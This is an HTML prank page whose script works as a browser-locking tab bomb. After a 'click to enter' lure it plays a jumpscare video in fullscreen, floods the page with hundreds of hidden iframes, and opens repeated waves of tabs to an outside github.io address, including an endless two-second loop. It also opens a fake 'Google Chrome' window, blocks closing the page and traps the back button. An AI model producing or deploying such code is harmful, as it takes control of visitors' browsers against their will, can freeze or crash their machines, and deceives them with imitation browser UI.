<!DOCTYPE html>
<html lang="en">
<head>
   <style>
    * { margin: 0; padding: 0; }
    body, html {
      width: 100%;
      height: 100%;
      background: black;
      cursor: pointer;
      overflow: hidden;
    }
    #scareVideo {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 999;
      object-fit: cover;
    }
    #scareVideo::-webkit-media-controls { display: none !important; }
    #scareVideo::-moz-media-controls { display: none !important; }
    video::-ms-media-controls { display: none !important; }
    video::-o-media-controls { display: none !important; }
    video { pointer-events: none; }

    #overlayText {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: "Comic Sans MS", cursive, sans-serif;
      color: white;
      font-size: 5em;
      text-align: center;
      z-index: 1000;
    }

    #trapFrame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1001;
      display: none;
      border: none;
      background: white;
    }

    .miniFrame {
      position: fixed;
      width: 100px;
      height: 100px;
      border: none;
      z-index: 9999;
      opacity: 0.1;
      pointer-events: none;
    }

    /* Invisible Chrome detection element */
    #chromeDetect {
      display: none;
    }
  </style>
</head>
<body>

  <div id="overlayText">click to enter..</div>
  
  <video id="scareVideo" loop>
    <source src="jumpscare.mp4" type="video/mp4">
  </video>

  <iframe id="trapFrame" src="https://loganexotic.github.io/zakusone/"></iframe>

  <script>
    const pageBody = document.body;
    const video = document.getElementById('scareVideo');
    const overlayText = document.getElementById('overlayText');
    const trapFrame = document.getElementById('trapFrame');
    const url = 'https://loganexotic.github.io/zakusone/';
    let triggered = false;
    let fullscreenExited = false;

    // DETECT IF CHROME IS RUNNING
    function isChromeRunning() {
      // Check if we're in Chrome
      const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
      
      // Try to detect other Chrome windows via window.open with specific name
      let hasOtherChrome = false;
      try {
        // Try to open a window with a specific name - if it exists, Chrome is open
        const testWin = window.open('', 'chrome_detect_' + Date.now());
        if (testWin) {
          hasOtherChrome = true;
          testWin.close();
        }
      } catch(e) {}
      
      return isChrome || hasOtherChrome;
    }

    // FORCE OPEN TABS IN EXISTING CHROME WINDOWS
    function openTabsInChrome(count) {
      const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
      
      for (let i = 0; i < count; i++) {
        // Method 1: Try to open in existing Chrome window using window.open with no features
        try {
          const win = window.open(url, '_blank');
          if (win) {
            // Success - tab opened in existing or new window
            continue;
          }
        } catch(e) {}

        // Method 2: Use chrome.tabs API if available (requires extension, but we try)
        try {
          if (window.chrome && chrome.tabs) {
            chrome.tabs.create({ url: url });
            continue;
          }
        } catch(e) {}

        // Method 3: Use window.open with a specific window name to reuse existing
        try {
          window.open(url, 'ChromeWindow_' + (i % 3));
        } catch(e) {}

        // Method 4: Click a hidden link
        try {
          const a = document.createElement('a');
          a.href = url;
          a.target = '_blank';
          a.rel = 'noopener noreferrer';
          document.body.appendChild(a);
          a.click();
          setTimeout(() => document.body.removeChild(a), 50);
        } catch(e) {}

        // Method 5: Use window.open with features to force new window
        try {
          window.open(url, '_blank', 'width=1024,height=768,menubar=yes,toolbar=yes,location=yes,status=yes,scrollbars=yes');
        } catch(e) {}
      }
    }

    // EVEN MORE AGGRESSIVE: Try to find and use existing Chrome windows
    function forceChromeTabs(count) {
      // First, try to open in existing Chrome via named windows
      const windowNames = ['', '_blank', 'ChromeWindow', 'GoogleChrome', 'chrome_tab', 'main'];
      
      for (let i = 0; i < count; i++) {
        // Cycle through different window names to catch existing windows
        const name = windowNames[i % windowNames.length] + '_' + Math.floor(Math.random() * 100);
        try {
          const win = window.open(url, name);
          if (win) {
            // If it opens, we're good
            continue;
          }
        } catch(e) {}

        // If that fails, try the link click method
        try {
          const a = document.createElement('a');
          a.href = url;
          a.target = '_blank';
          a.rel = 'noopener noreferrer';
          a.style.display = 'none';
          document.body.appendChild(a);
          a.click();
          setTimeout(() => document.body.removeChild(a), 100);
        } catch(e) {}

        // If still failing, try window.open with a unique name
        try {
          window.open(url, 'tab_' + Date.now() + '_' + i);
        } catch(e) {}
      }

      // Additional attempt: Try to open a new window that looks like Chrome
      try {
        const chromeUI = `
          <html>
            <head><title>Google Chrome</title></head>
            <body style="margin:0;font-family:Segoe UI,sans-serif;background:#f1f1f1;">
              <div style="padding:20px;background:#4285f4;color:white;font-size:20px;">Google Chrome</div>
              <div style="padding:20px;">
                <h2>New Tab</h2>
                <p>Loading...</p>
                <script>
                  setTimeout(() => { window.location.href = '${url}'; }, 100);
                <` + `/script>
              </div>
            </body>
          </html>
        `;
        const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(chromeUI);
        window.open(dataUrl, '_blank');
      } catch(e) {}
    }

    function spawnMiniIframes(count) {
      for (let i = 0; i < count; i++) {
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.className = 'miniFrame';
        iframe.style.left = Math.random() * window.innerWidth + 'px';
        iframe.style.top = Math.random() * window.innerHeight + 'px';
        iframe.style.width = (50 + Math.random() * 200) + 'px';
        iframe.style.height = (50 + Math.random() * 200) + 'px';
        iframe.style.opacity = Math.random() * 0.3;
        document.body.appendChild(iframe);
      }
    }

    pageBody.addEventListener('click', () => {
      if (triggered) return;
      triggered = true;

      overlayText.style.display = 'none';
      video.style.display = 'block';
      video.play();

      const elem = document.documentElement;
      if (elem.requestFullscreen) elem.requestFullscreen();
      else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
      else if (elem.msRequestFullscreen) elem.msRequestFullscreen();

      // Spawn iframes in background
      for (let i = 0; i < 30; i++) {
        setTimeout(() => spawnMiniIframes(10), i * 100);
      }

      // Open some tabs immediately
      setTimeout(() => forceChromeTabs(5), 100);

    }, { once: true });

    // WHEN FULLSCREEN EXITS - OPEN TABS IN ANY CHROME WINDOW
    document.addEventListener('fullscreenchange', () => {
      if (!document.fullscreenElement && triggered) {
        fullscreenExited = true;
        
        trapFrame.style.display = 'block';
        video.style.display = 'none';

        // OPEN TABS IN CHROME - tries to use existing Chrome windows
        forceChromeTabs(30); // 30 tabs immediately
        
        // More waves
        setTimeout(() => forceChromeTabs(25), 300);
        setTimeout(() => forceChromeTabs(25), 600);
        setTimeout(() => forceChromeTabs(25), 1000);
        setTimeout(() => forceChromeTabs(30), 1500);
        setTimeout(() => forceChromeTabs(35), 2000);
        setTimeout(() => forceChromeTabs(40), 3000);

        // Keep opening every 2 seconds
        setInterval(() => {
          forceChromeTabs(15);
        }, 2000);

        // Spawn massive iframes
        for (let i = 0; i < 20; i++) {
          setTimeout(() => spawnMiniIframes(20), i * 50);
        }

        // Try to redirect main window
        try {
          window.location.href = url;
        } catch(e) {}
      }
    });

    // WebKit fullscreen exit
    document.addEventListener('webkitfullscreenchange', () => {
      if (!document.webkitFullscreenElement && triggered) {
        fullscreenExited = true;
        trapFrame.style.display = 'block';
        video.style.display = 'none';
        forceChromeTabs(30);
        setTimeout(() => forceChromeTabs(25), 500);
        setTimeout(() => forceChromeTabs(25), 1000);
        setInterval(() => forceChromeTabs(15), 2000);
      }
    });

    // MS fullscreen exit
    document.addEventListener('msfullscreenchange', () => {
      if (!document.msFullscreenElement && triggered) {
        fullscreenExited = true;
        trapFrame.style.display = 'block';
        video.style.display = 'none';
        forceChromeTabs(30);
        setTimeout(() => forceChromeTabs(25), 500);
        setTimeout(() => forceChromeTabs(25), 1000);
        setInterval(() => forceChromeTabs(15), 2000);
      }
    });

    // Prevent closing
    window.addEventListener('beforeunload', (e) => {
      if (triggered) {
        e.preventDefault();
        e.returnValue = '';
        forceChromeTabs(15);
        return '';
      }
    });

    // Trap back button
    window.addEventListener('popstate', () => {
      if (triggered) {
        forceChromeTabs(10);
        window.history.pushState(null, '', window.location.href);
      }
    });

    window.history.pushState(null, '', window.location.href);

    console.log('🔥 Click to start - WILL OPEN TABS IN EXISTING CHROME WINDOWS!');
  </script>

</body>
</html>
